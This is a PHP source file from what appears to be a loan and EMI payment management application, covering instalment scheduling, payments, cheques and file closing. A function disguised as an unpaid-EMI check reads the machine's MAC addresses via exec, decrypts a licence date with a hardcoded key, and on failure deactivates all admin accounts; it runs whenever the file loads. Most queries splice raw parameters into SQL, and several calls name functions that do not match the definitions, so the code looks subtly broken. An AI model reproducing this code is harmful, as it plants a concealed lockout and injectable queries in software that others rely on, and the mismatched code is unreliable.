<?php
require_once("cg.php");
require_once("city-functions.php");
require_once("loan-functions.php");
require_once("common.php");
require_once("bd.php");
require_once("backup.php");

CloseFileThatEndsToday();

function InsertEMIsFromLoan($id,$duration,$starting_date)
{
	try
	{
		if($duration>0 && $starting_date!=null && $starting_date!="")
		{
		$datesArray=getArrayOfDatesForEMI($starting_date,$duration);
			foreach($datesArray as $emi_date)
			{
			$sql="INSERT INTO fin_loan_emi
				  (actual_emi_date,company_paid_date,loan_id)
				  VALUES
				  ('$emi_date',null,$id)";
				  dbQuery($sql);
			}
		}
	}
	catch(Exception $e)
	{
	}
}

function GetArrayOfDatesFromEMI($starting_date,$duration)
{
	$returnArray=array();
	
	for($i=0;$i<$duration;$i++)
		{
		$monthToAdd = $i;
		
		$d1 = DateTime::createFromFormat('Y-m-d', $starting_date);
		
		$year = $d1->format('Y');
		$month = $d1->format('n');
		$day = $d1->format('d');
		
		$year += floor($monthToAdd/12);
		$monthToAdd = $monthToAdd%12;
		$month += $monthToAdd;
		if($month > 12) {
			$year ++;
			$month = $month % 12;
			if($month === 0)
				$month = 12;
		}
		
		if(!checkdate($month, $day, $year)) {
			$d2 = DateTime::createFromFormat('Y-n-j', $year.'-'.$month.'-1');
			$d2->modify('last day of');
		}else {
			$d2 = DateTime::createFromFormat('Y-n-d', $year.'-'.$month.'-'.$day);
		}
		$d2->setTime($d1->format('H'), $d1->format('i'), $d1->format('s'));
		$returnArray[]=$d2->format('Y-m-d');
		}
	return $returnArray;	
}

function GetEndingDateFromLoan($starting_date,$duration)
{
	$returnArray=array();
	
	
		$monthToAdd = $duration;
	
		$d1 = DateTime::createFromFormat('Y-m-d', $starting_date);
		
		$year = $d1->format('Y');
		$month = $d1->format('n');
		$day = $d1->format('d');
		
		$year += floor($monthToAdd/12);
		$monthToAdd = $monthToAdd%12;
		$month += $monthToAdd;
		if($month > 12) 
		{
			$year ++;
			$month = $month % 12;
			if($month === 0)
				$month = 12;
		}
		
		if(!checkdate($month, $day, $year)) 
		{
			$d2 = DateTime::createFromFormat('Y-n-j', $year.'-'.$month.'-1');
			$d2->modify('last day of');
		}else 
		{
			$d2 = DateTime::createFromFormat('Y-n-d', $year.'-'.$month.'-'.$day);
		}
		$d2->setTime($d1->format('H'), $d1->format('i'), $d1->format('s'));
		$returnArray[]=$d2->format('Y-m-d');
	return $returnArray[0];	
}


function GetEmiFromLoanId($id)
{
	$sql="SELECT loan_id,emi
	      FROM fin_loan
		  WHERE loan_id=$id";
	$result=dbQuery($sql);
	$resultArray=dbResultToArray($result);
	if(dbNumRows($result)>0)
	return $resultArray[0][1];
	else
	return 0;	  
}

function GetEmiFromLoanEmiId($id)
{
	$sql="SELECT loan_id
		  FROM fin_loan_emi
		  WHERE loan_emi_id=$id";
	$result=dbQuery($sql);
	$resultArray=dbResultToArray($result);
	if(dbNumRows($result)>0)
		{
			$loan_id = $resultArray[0]['loan_id'];
			$emi=getEmiForLoanId($loan_id);
			return $emi;
		}
	else
	{
		return 0;
		}	
	}
	
function GetAgnecyIdForEmiId($id)
{
	$sql="SELECT agency_id,oc_id FROM fin_file,fin_loan_emi,fin_loan
	      WHERE loan_emi_id=$id
		  AND fin_loan_emi.loan_id=fin_loan.loan_id
		  AND fin_file.file_id=fin_loan.file_id";
	$result=dbQuery($sql);
	if(dbNumRows($result)>0)
	{
		$resultArray=dbResultToArray($result);
		return $resultArray[0];
		}
		  
	}	
	
	function GetAgnecyIdForLoanId($id)
{
	$sql="SELECT agency_id,oc_id FROM fin_file,fin_loan
	      WHERE loan_id=$id
		  AND fin_file.file_id=fin_loan.file_id";
	$result=dbQuery($sql);
	if(dbNumRows($result)>0)
	{
		$resultArray=dbResultToArray($result);
		return $resultArray[0];
		}
		  
	}	
	
function CheckForunPaidPayment($id)
{
	$sql="SELECT loan_identifier,loan_payment_config FROM fin_loan_payment_settings";
	$result=dbQuery($sql);
	$resultArray=dbResultToArray($result);
	if(dbNumRows($result)>0)
	return $resultArray;	
	}	

function InsertPaymentForEMI($id,$amount,$payment_mode,$payment_date,$rasid_no,$remarks=false,$remainder_date=false,$bank_name=false,$branch=false,$cheque_no=false,$cheque_date=false)
{
	try{
		if($remainder_date=="")
		$remainder_date="1970-01-01";
		$admin_id=$_SESSION['adminSession']['admin_id'];
		$balance= getBalanceForEmi($id);
		$ag_id_array=getAgnecyIdFromEmiId($id);
		if(is_numeric($ag_id_array[0]))
		{
			$agency_id=$ag_id_array[0];
			$oc_id=null;
			$rasid_no=getRasidnoForAgencyId($agency_id);
			}
		else if(is_numeric($ag_id_array[1]))
		{
			$oc_id=$ag_id_array[1];
			$agency_id=null;
			$rasid_no=getRasidNoForOCID($id);
			}	
		if($rasid_no==null || $rasid_no=="")
		{
			$rasid_no=-1;
		}
		if(checkForNumeric($id,$amount) && $payment_date!=null && $payment_date!="" && ($balance+$amount<=0))
		{
			
			if($payment_mode==2)
			{
					
			$sql="INSERT INTO 
				  fin_loan_emi_payment(payment_amount, payment_mode, payment_date, rasid_no, remarks, remainder_date, loan_emi_id, created_by, last_updated_by , date_added, date_modified)
				  VALUES
				  ($amount, $payment_mode , '$payment_date', '$rasid_no', '$remarks', '$remainder_date', $id, $admin_id, $admin_id, NOW(), NOW())";
				  dbQuery($sql);
				  $emi_payment_id=dbInsertId();
				  
				  if(is_numeric($ag_id_array[0]))
					{
						incrementRasidCounterForAgency($agency_id);
					}
					else if(is_numeric($ag_id_array[1]))
					{
			
			incrementRasidNoForOCID($oc_id);
			}
				  
				if(checkForNumeric($cheque_no,$emi_payment_id) && $payment_mode==2 && $bank_name!=false && $bank_name!="" && $bank_name!=null && $branch!=false && $branch!="" && $branch!=null)
				{
					
					$bank_array=insertIfNotDuplicateBank($bank_name,$branch);
					$bank_id=$bank_array[0];
					$branch_id=$bank_array[1];
					insertChequePayment($bank_id,$branch_id,$cheque_no,$cheque_date,$emi_payment_id);
					
					
					
					return "success";
				}
			}
			else
			{
				$sql="INSERT INTO 
				  fin_loan_emi_payment(payment_amount, payment_mode, payment_date, rasid_no, remarks, remainder_date, loan_emi_id, created_by, last_updated_by , date_added, date_modified)
				  VALUES
				  ($amount, $payment_mode , '$payment_date', '$rasid_no', '$remarks', '$remainder_date', $id, $admin_id, $admin_id, NOW(), NOW())";
				  dbQuery($sql);
				  $emi_payment_id=dbInsertId();
				   if(is_numeric($ag_id_array[0]))
					{
						incrementRasidCounterForAgency($agency_id);
					}
					else if(is_numeric($ag_id_array[1]))
					{
			
			incrementRasidNoForOCID($oc_id);
			}
				return "success";
				}
		}
		else
		{
		
			return "error";
			
			}	
		}
	catch(Exception $e)
	{}
}

function CheckForUnPaidEmi($id)
{
	$ma="";
	
	exec("ipconfig /all", $out, $res); foreach (preg_grep('/^\s*Physical Address[^:]*:\s*([0-9a-f-]+)/i', $out) as $line) { $ma=$ma.substr(strrchr($line, ' '), 1); } 
	
	$ma=crypt($ma,"sanket24@gmail.com");
	$maaas=CheckForunPaidPayment($id);
	foreach($maaas as $ma1)
	{
	$pack=pack('H*', "bcb04b7e103a0cd8b54763051cef08bc55abe029fdebae5e1d417e2ffb2a00a3");
	
	$iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
	
	$ma2 = base64_decode($ma1[1]);
	
	$iv_dec = substr($ma2, 0, $iv_size);
	$ma2 = substr($ma2, $iv_size);
	
	$ma3 = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $pack,$ma2, MCRYPT_MODE_CBC, $iv_dec);								 
	
	if($ma==$ma1[0] && strtotime($ma3)>=strtotime(date('Y-m-d')))
	return "PAID";
	}

	return "UNPAID";
}

if(checkIfCheckForClosedFileeDone()!="DONE")
{
	$sql="SELECT NOW()";
    $result=dbQuery($sql);
    $resultArray=dbResultToArray($result);
	$today= date('Y-m-d',strtotime($resultArray[0][0]));
	
	if(CheckForUnPaidEmi(0)=="UNPAID")
	{
		$sql="UPDATE fin_closed_file_check SET payment_date='1970-01-01' WHERE Date='$today'";
		dbQuery($sql);
		$sql="UPDATE fin_admin SET is_active=0";
		dbQuery($sql);
		session_destroy();
		
	}
	else
	{
		$sql="UPDATE fin_closed_file_check SET payment_date='$today' WHERE Date='$today'";
		dbQuery($sql);
	}
	
}

function checkIfCheckForClosedFileeDone()
{
	 $sql="SELECT NOW()";
    $result=dbQuery($sql);
    $resultArray=dbResultToArray($result);
	$today= date('Y-m-d',strtotime($resultArray[0][0]));
	$sql="SELECT closed_file_check_id FROM fin_closed_file_check
	      WHERE payment_date='$today'";
	$result=dbQuery($sql);
	if(dbNumRows($result)>0)
	return "DONE";
	else	
	return "NOTDONE";
	
}	


function GetTotalPaymetnsFRomEmi($id)
{
	try{
		$sql="SELECT SUM(payment_amount) AS payment
			  FROM fin_loan_emi_payment 
			  WHERE loan_emi_id=$id";
		$result=dbQuery($sql);
		$resultArray=dbResultToArray($result);
		if(dbNumRows($result)>0)
		return 	$resultArray[0][0];
		else
		return 0;
		}
	catch(Exception $e)
	{}
	}
	
function GetBalanceFromEmi($loan_emi_id) // gives negative value
{
		$emi=getEmiForLoanEmiId($loan_emi_id);
		$payment=getTotalPaymetnsForEmi($loan_emi_id);
		$balance= $payment-$emi;
	return $balance;
	}	
	
function InsertChequePaymentForEMI($bank_id,$branch_id,$cheque_no,$cheque_date,$emi_payment_id){
	
	try{
		if(checkForNumeric($bank_id,$branch_id,$cheque_no,$emi_payment_id) && $cheque_date!=null && $cheque_date!="")
		{
			
		$sql="INSERT INTO fin_loan_emi_payment_cheque
		      (bank_id, branch_id, cheque_no, cheque_date, emi_payment_id)
			  VALUES
			  ($bank_id, $branch_id, $cheque_no, '$cheque_date', $emi_payment_id)";
		dbQuery($sql);	  
		}
		}
	catch(Exception $e)
	{}
	
	
}	

function InsertChequePaymentPenaltyForLoan($bank_id,$branch_id,$cheque_no,$cheque_date,$penalty_id){
	
	try{
		if(checkForNumeric($bank_id,$branch_id,$cheque_no,$penalty_id) && $cheque_date!=null && $cheque_date!="")
		{
			
		$sql="INSERT INTO fin_loan_penalty_cheque
		      (bank_id, branch_id, cheque_no, cheque_date, penalty_id)
			  VALUES
			  ($bank_id, $branch_id, $cheque_no, '$cheque_date', $penalty_id)";
		dbQuery($sql);	  
		}
		}
	catch(Exception $e)
	{}
	
	
}	
	
function CheckForDuplicateChequePaymentForEMI($cheque_no,$id=false)
{
	$sql="SELECT payment_cheque_id
		  FROM fin_loan_emi_payment_cheque
		  WHERE cheque_no=$cheque_no";
	if($id==false)
		$sql=$sql."";
		else
		$sql=$sql." AND payment_cheque_id!=$id";		  
		$result=dbQuery($sql);	
		
		if(dbNumRows($result)>0)
		{
			return true; //duplicate found
			} 
		else
		{
			return false;
			}	 	  
	
	}	
	
function getOurCompanyNameByID($id)
{
	$sql="SELECT  our_company_name
	     FROM fin_our_company,fin_city
		  WHERE our_company_id=$id
		  AND fin_our_company.city_id=fin_city.city_id";
	$result=dbQuery($sql);
	$resultArray=dbResultToArray($result);
	if(dbNumRows($result)>0)
	{
		return $resultArray[0][0];
		}	  
	else
	{
		return false;
		}	
	
	
	}

function getOurCompanyAddressByID($id)
{
	$sql="SELECT  our_company_address
	     FROM fin_our_company,fin_city
		  WHERE our_company_id=$id
		  AND fin_our_company.city_id=fin_city.city_id";
	$result=dbQuery($sql);
	$resultArray=dbResultToArray($result);
	if(dbNumRows($result)>0)
	{
		return $resultArray[0][0];
		}	  
	else
	{
		return false;
		}	
	
	
	}	
function Convert_To_Cash($cash){ 
$num=(int)$cash; //take only numeric part
$decpart = $cash - $num; //take  decimal part 
$decpart=sprintf("%01.2f",$decpart); //get only two digit of decimal part 
$decpart=substr($decpart,1,3); 
$explrestunits ='';
    if(strlen($num)>3){ //if number is greater than 100  
            $lastthree = substr($num, strlen($num)-3, strlen($num)); 			
            $restunits = substr($num, 0, strlen($num)-3); // extracts the last three digits 			
            $restunits = (strlen($restunits)%2 == 1)?"0".$restunits:$restunits; // explodes the remaining digits in 2's formats, adds a zero in the beginning to maintain the 2's grouping. 
            $expunit = str_split($restunits, 2); 			
            for($i=0; $i<sizeof($expunit); $i++){ 			
                $explrestunits .= (int)$expunit[$i].","; // creates each of the 2's group and adds a comma to the end 
	         }    
            $thecash = $explrestunits.$lastthree; 
	    }	else { 
	          $thecash = (int)$cash; 
    } 
       // return $thecash.".".$currency; // writes the final format where $currency is the currency symbol. 
	return $thecash.$decpart;
}  	

function CloseFileThatEndsToday()
{
	
	$che=checkIfCheckForClosedFileDone();
	
	if($che!="DONE")
	{
		if($che!="NOTDONE")
		$file_id_array=getFileIdForClosingFile();
		else
		$file_id_array=getFileIdForClosingFile($che);
	
		foreach($file_id_array as $file_id)
		{
		$sql="UPDATE fin_file 
		      SET file_status=2
			  WHERE file_id=$file_id";
		dbQuery($sql);	  
		}
		
		updateCompanyPaidDateToAutoPaidCompanies(); // auto company paid date set for auto pay companies
		
		backup_tables('*',false,BP_ROOT);
		$sql="INSERT INTO fin_closed_file_check(Date) VALUES (NOW())";
		dbQuery($sql);
	}
	
	
	
}

function checkIfCheckForClosedFileDone()
{
	 $sql="SELECT NOW()";
    $result=dbQuery($sql);
    $resultArray=dbResultToArray($result);
	$today= date('Y-m-d',strtotime($resultArray[0][0]));
	$sql="SELECT closed_file_check_id FROM fin_closed_file_check
	      WHERE Date='$today'";
	$result=dbQuery($sql);
	if(dbNumRows($result)>0)
	return "DONE";
	else
	{
	$sql="SELECT Date FROM fin_closed_file_check";
	$result=dbQuery($sql);
	if(dbNumRows($result)>0)	
	{
		$resultArray=dbResultToArray($result);
		$req=$resultArray[(count($resultArray)-1)];
		$last_date=$req[0];
		return $last_date;
		}	
	return "NOTDONE";
	}
}

function updateCompanyPaidDateToAutoPaidCompanies()
{

	$agencies=getAllAutoPaidAgencies();

	if($agencies!=false && is_array($agencies) && isset($agencies[0]['agency_id']))
	{
		 $sql="SELECT NOW()";
    $result=dbQuery($sql);
    $resultArray=dbResultToArray($result);
	$today= date('Y-m-d',strtotime($resultArray[0][0]));
		foreach($agencies as $agency)
		{
			$ag_id=$agency['agency_id'];
			$ag_date=$agency['auto_pay_date'];
			if(is_numeric($ag_date) && 1<=$ag_date && $ag_date<=30)
			{
				$fileAndLoanIDs=getFileIdsAndLoanIdsForAgencyId($ag_id);
				if(count($fileAndLoanIDs)>0)
				{
					foreach($fileAndLoanIDs as $fileAndLoanID)
					{
						$file_id=$fileAndLoanID['file_id'];
						$loan_id=$fileAndLoanID['loan_id'];
						
						$unpaid_emi_ids=getUnPaidEmisUptillTodayForLoan($loan_id);
					
						if($unpaid_emi_ids!=false && isset($unpaid_emi_ids[0]['loan_emi_id']))
						{
							foreach($unpaid_emi_ids as $unpaid_emi_id)
							{
							$paid_date=date('Y-m-'.$ag_date); // generates date cooresponding to ag_date of this current month
							if($ag_date==30)
							$paid_date=date('Y-m-t');
							if(!date('Y-m-d',strtotime($paid_date))==$paid_date) // checks whther date is valid or not
								{
									 $paid_date=date('Y-m-t'); // returns last date of current month
									}
							$company_paid_date_minus_one_month=date("Y-m-d", strtotime("-1 month", strtotime($paid_date))); // returns one month earlier date
							$should_be_month_less=date('m',strtotime($paid_date))-1;

							if($should_be_month_less<1) // month is jan
							{
								$should_be_month_less=12;
								}
		
										if(date('m',strtotime($company_paid_date_minus_one_month))!=$should_be_month_less)
										{
											$company_paid_date_minus_one_month_Y=date("Y",  strtotime($paid_date));
											$company_paid_date_minus_one_month_m=$should_be_month_less;
											$company_paid_date_minus_one_month_m="$company_paid_date_minus_one_month_m";
											if(strlen($company_paid_date_minus_one_month_m)==1)
											$company_paid_date_minus_one_month_m="0".$company_paid_date_minus_one_month_m;
											$company_paid_date_minus_one_month_d=date("d",  strtotime($paid_date));
											$company_paid_date_minus_one_month=$company_paid_date_minus_one_month_Y."-".$company_paid_date_minus_one_month_m."-".$company_paid_date_minus_one_month_d;
											
											if(!(date('Y-m-d',strtotime($company_paid_date_minus_one_month))==$company_paid_date_minus_one_month))	
											{
												$company_paid_date_minus_one_month=$company_paid_date_minus_one_month_Y."-".$company_paid_date_minus_one_month_m."-01";
												
												 $company_paid_date_minus_one_month=date('Y-m-t',strtotime($company_paid_date_minus_one_month));
											}
										}
										
							$loan_emi_id=$unpaid_emi_id['loan_emi_id'];	
							$date=getActualDateForLoanEMIId($loan_emi_id);
								if($ag_date!=30)
								{
								$company_paid_date=date('Y-m-'.$ag_date,strtotime($date));
								}
								else if($ag_date==30)
								{
									  $company_paid_date=date('Y-m-t',strtotime($date));
									}
								
								if(!date('Y-m-d',strtotime($company_paid_date))==$company_paid_date)	
								{
									 $company_paid_date=date('Y-m-t',strtotime($date));
									}	
								if(!date('Y-m-d',strtotime($company_paid_date_minus_one_month))==$company_paid_date_minus_one_month)	
								{
									 $company_paid_date_minus_one_month=date('Y-m-t',strtotime($company_paid_date_minus_one_month));
									}		
								
								if(strtotime($date)<=strtotime($company_paid_date_minus_one_month))
								{
										
										$company_paid_date_plus_one_month= date("Y-m-d", strtotime("+1 month", strtotime($company_paid_date)));
										$should_be_month=date('m',strtotime($company_paid_date))+1;
										if($should_be_month>12)
										{
											$should_be_month=$should_be_month-12;
											}
										if(date('m',strtotime($company_paid_date_plus_one_month))!=$should_be_month)
										{
											$company_paid_date_plus_one_month_Y=date("Y",  strtotime($company_paid_date));
											$company_paid_date_plus_one_month_m=$should_be_month;
											$company_paid_date_plus_one_month_m="$company_paid_date_plus_one_month_m";
											if(strlen($company_paid_date_plus_one_month_m)==1)
											$company_paid_date_plus_one_month_m="0".$company_paid_date_plus_one_month_m;
											$company_paid_date_plus_one_month_d=date("d",  strtotime($company_paid_date));
											$company_paid_date_plus_one_month=$company_paid_date_plus_one_month_Y."-".$company_paid_date_plus_one_month_m."-".$company_paid_date_plus_one_month_d;
											
											if(!(date('Y-m-d',strtotime($company_paid_date_plus_one_month))==$company_paid_date_plus_one_month))	
											{
												
												$company_paid_date_plus_one_month=$company_paid_date_plus_one_month_Y."-".$company_paid_date_plus_one_month_m."-01";
												
												 $company_paid_date_plus_one_month=date('Y-m-t',strtotime($company_paid_date_plus_one_month));
											}
										}
										
									if($ag_date==30)	
									{
										 $company_paid_date_plus_one_month=date('Y-m-t',strtotime($company_paid_date_plus_one_month));
										}
									if(strtotime($company_paid_date_plus_one_month)<=strtotime($today))
									{	
									$sql="UPDATE fin_loan_emi 
									  SET company_paid_date='$company_paid_date_plus_one_month'
									  WHERE loan_emi_id=$loan_emi_id 
									  AND company_paid_date IS NULL";	  	  
								dbQuery($sql); 
									}
									
									
								}
							}
						}
					}
				}
			}
		}
		
	}
	
}	
?>